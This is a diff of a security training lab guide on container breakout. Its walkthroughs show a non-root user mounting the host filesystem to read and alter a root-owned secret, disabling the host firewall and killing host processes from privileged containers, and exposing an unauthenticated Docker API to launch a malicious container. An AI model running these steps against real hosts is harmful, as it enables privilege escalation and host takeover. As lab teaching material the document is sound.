@@ -1,138 +1,359 @@
-## Container Breakout - Multiple Attacks
+# **Container Breakout - Multiple Attacks**
 
-### Volume Mounts
 
-* ssh into the container virtual lab or open Terminal in the VM
+### *Gaining access and tampering Host resources from a container*
 
-    ```
-    ssh root@<IPAddrGivenToYou>
-    password: <passwordGivenToYou>
+-------
 
-    ```
+## *Volume Mounts*
 
-* Run `whoami` to confirm that you are the `root` user.
+### * *
 
-```commandline
-root@we45:~# whoami
-root
-root@we45:~#
-```
+-------
 
-* Validate that there's a secrets file in the root dir with `cat secret.txt`
+#### Step 1:
 
-* Run `sudo su we45` to login as a normal user.
-
-    ```commandline
-    root@we45:~# sudo su we45
-    we45@we45:~$
-    ```
-
-* Check if the user `we45` has access to `docker` by running `docker images` and `docker ps`
-
-    ```commandline
-    we45@we45:~$ docker images
-    we45@we45:~$ docker ps
-    ```
-
-* Run `cat /root/secret.txt` read the content of `secret.txt` file that was created by `root` user.
+* Validate that you are the `root` user on the provisioned server
 
 ```commandline
-we45@we45:~$ cat /root/secret.txt
-cat: /root/secret.txt: Permission denied
+whoami
 ```
 
-* Run `docker run -ti --rm -v /root:/hostFS/ alpine sh` as `we45`(non-root user)
+* Validate that there's a secret file in the root directory
 
 ```commandline
-we45@we45:~$ docker run -ti -v /:/hostFS/ alpine
-/ #
+cat /root/secret.txt
 ```
 
-* Run `cat /hostFS/root/secret.txt` to view the content of the file.
+-------
+
+#### Step 2:
+
+* Switch to a non-root user
 
 ```commandline
-/hostFS/root # cat /hostFS/root/secret.txt
-This is a secret
+sudo su we45
+
+whoami
 ```
 
-* Run `exit` to exit from the container.
+* Check if the non-root user(`we45`) has access to `docker`
 
 ```commandline
-/hostFS/root # exit
-we45@we45:~$
+docker images
+
+docker ps
 ```
 
-* Run `clean-docker` to stop all the containers
+* Try to read the contents of the `secret` file created by the root user
 
 ```commandline
-root@we45:~$ clean-docker
+cat /root/secret.txt
 ```
 
-### PID Boundary
+-------
 
-* Run `tmux` to create a multiplexed terminal. Your screen should have a band below that looks like this:
+#### Step 3:
 
-![](img/tmux-greenband.png)
-
-* Now, type `ctrl + b + "` to split panes horizontally. We're going to operate on two panes
-
-![](img/split_pane.png)
-
-* Let's first operate on the top pane, with the command `ctrl + b + (upper arrow key)`
-* Let's first create our "super important process" with the following commands: 
-    ```
-    command='while true\ndo\necho "Super important process running $$"\nsleep 3\ndone'
-    printf "$command" > /root/super_important_process.sh && chmod +x /root/super_important_process.sh
-    ```
-
-* Now, run our program `./root/super_important_process.sh`. It should start running a "super important" process
-* Let's operate on the lower pane with `ctrl + b + (lower arrow key)`
-* Here, run `docker run -ti --pid=host --privileged alpine sh`
-* Now run `ps aux` and look at the process tree. You will see that your container's processes and the host's processes have NOT been isolated
-* Now run `ps aux | grep 'super'` to triangulate the super_important process. get the `pid` of the process
-* now run `kill <pid>` and you will see that the super important process (running on host) is now terminated.
-
-![](img/terminate_process.png)
-
-* Let's dismantle the multiplexed terminal session, with `ctrl + b + x`, you will be presented with a prompt like this:
-
-![](img/remove_tmux.png)
-
-* press `y` to select `yes` and the window shuts down. Do the same with the other tmux session as well
-
-### Host Network
-
-* Check if `ufw` is enabled on the host machine by running `ufw status`
+* As a non-root user(`we45`), launch a container and expose the root-filesystem
 
 ```commandline
-root@we45:~# ufw status
-Status: inactive
+docker run -ti --rm -v /root:/hostFS/ alpine sh
 ```
 
-* Enable `ufw` by running `ufw enable` and `ufw allow ssh`
+* On the container, try to read and edit the secret file
 
-* Run `docker run -d -p 5000:5000 --privileged --net=host abhaybhargav/vul_flask`
+```commandline
+cat /hostFS/root/secret.txt
 
+echo "Tampered data!!" >> /hostFS/root/secret.txt
 ```
+
+* Exit from the container
+
+```commandline
+exit
+```
+
+* Switch to `root` user
+
+```commandline
+exit
+```
+
+-------
+
+#### Step 4:
+
+* Stop all containers
+
+```commandline
+clean-docker
+```
+
+-------
+
+## *Host Network*
+
+### * *
+
+-------
+
+#### Step 1:
+
+* Check `ufw` status on the provisioned server
+
+```commandline
+ufw status
+```
+
+* Enable `ufw` and allow `ssh` to ensure that the connection to the provisioned server persists
+
+```commandline
+ufw enable
+
+ufw allow ssh
+
+ufw status
+```
+
+-------
+
+#### Step 2:
+
+* Launch a container binding the host network to the docker network
+
+```commandline
 docker run -d -p 5000:5000 --privileged --net=host abhaybhargav/vul_flask
-WARNING: Published ports are discarded when using host network mode
-de08041d12e0ed8f4aa0ee3ceeef65c760baee2b9d1c839a89d5ba642a506d03
 ```
 
-* Now run `docker ps` and copy the `CONTAINER_ID` of the running container
+* Fetch the `CONTAINER_ID` of the running container
 
-```
-[root@container-training-centos ~]# docker ps
-CONTAINER ID        IMAGE                    COMMAND             CREATED             STATUS              PORTS               NAMES
-de08041d12e0        abhaybhargav/vul_flask   "python app.py"     3 seconds ago       Up 2 seconds                            dreamy_ptolemy
+```commandline
+docker ps
 ```
 
-* Now run `docker exec -it <container ID> /bin/bash` you should now be in the shell environment in the container
+* Exec into the container environment
 
-* Run `apt update && apt install -y ufw` to install the firewall program
+```commandline
+docker exec -ti <CONTAINER_ID> /bin/bash
+```
 
-* Run `ufw status` and you should see that the firewall is active.
+-------
 
-* Now run `ufw disable` to disable the firewall from the Container
+#### Step 3:
 
-* Run `exit` to exit the docker shell and run `clean-docker`
+* On the container, install the firewall program(`ufw`)
+
+```commandline
+apt update && apt install -y ufw
+```
+
+* Check the status of the firewall inside the container
+
+```commandline
+ufw status
+```
+
+* Disable the host machine firewall from a container
+
+```commandline
+ufw disable
+
+ufw status
+```
+
+* Exit from the container
+
+```commandline
+exit
+```
+
+-------
+
+#### Step 4:
+
+* Stop all containers
+
+```commandline
+clean-docker
+```
+
+---------
+
+## *PID Boundary*
+
+### * *
+
+-------
+
+#### Step 1:
+
+* Navigate to the `Container Breakout` directory on the provisioned server
+
+```commandline
+cd /root/container-training/Container/container-breakout/
+```
+
+* Multiplex terminal session with `tmux` and split panes horizontally.
+
+```
+tmux
+
+tmux split-window -v
+```
+
+-------
+
+#### Step 2:
+
+* Create a "Super Important Process" that is to be tampered with
+
+```commandline
+command='while true\ndo\necho "Super important process running $$"\nsleep 3\ndone'
+printf "$command" > super_important_process.sh && chmod +x super_important_process.sh
+```
+
+* Run the "Super Important Process" that was just created and fetch the `Process-ID`
+
+```commandline
+./super_important_process.sh
+```
+
+-------
+
+#### Step 3:
+
+* With `tmux`, switch to the lower panel
+
+```commandline
+# Switches to the lower panel
+ctrl + b + (lower arrow key) 
+```
+
+* Launch a container and mount the host processes on the container
+
+```commandline
+docker run -ti --pid=host --privileged alpine sh
+```
+
+* Inside the container, try to terminate the "Super Important Process"
+
+```commandline
+kill <PID>
+```
+
+-------
+
+#### Step 4:
+
+* Exit from the container and the `tmux` sessions
+
+```commandline
+exit
+
+exit
+```
+
+-------
+
+#### Step 5:
+
+* Stop all containers
+
+```commandline
+clean-docker
+```
+
+---------
+
+---------
+
+## *Docker Config*
+
+### *A malicious user who gains access Docker API, can launch a container and gain access to the host machine with root permissions.*
+
+-------
+
+#### Step 1:
+
+* Navigate to the `Container Breakout` directory on the provisioned server
+
+```commandline
+cd /root/container-training/Container/container-breakout/
+```
+
+* Enable the docker API
+
+```commandline
+sed -i '/ExecStart/c\ExecStart=/usr/bin/dockerd -H fd:// -H tcp://0.0.0.0:4243' /lib/systemd/system/docker.service
+
+systemctl daemon-reload
+
+service docker restart
+```
+
+-------
+
+#### Step 2:
+
+* Fetch the IP of the provisioned server
+
+```commandline
+serverip
+```
+
+* Run an Nmap Scan on the provisioned server to get the list of port and services
+
+```commandline
+# We're running scan against a single port to save some time, but this might take a while
+nmap <IP> -sV -p 4243
+```
+
+* On the browser, verify access to the docker API
+
+```commandline
+http://<IP>:4243/version
+
+http://<IP>:4243/images/json
+```
+
+-------
+
+#### Step 3:
+
+* Create and activate the python virtual environment and run the script that will launch a malicious container via. the docker API.
+
+```commandline
+apt install -y virtualenv && export LC_ALL="en_US.UTF-8" && export LC_CTYPE="en_US.UTF-8"
+
+virtualenv venv
+
+source venv/bin/activate
+
+pip install -r requirements.txt
+
+python launch-malicious-docker.py
+```
+
+* On the browser, try to access the service running on the container
+
+```commandline
+http://<IP>:6080/vnc.html
+```
+
+* Once connected to the `VNC`, `Right-Click` to get access to the container terminal
+
+-------
+
+#### Step 4:
+
+* Stop all containers
+
+```commandline
+clean-docker
+```
+
+---------
+
+### Reading Material/References:
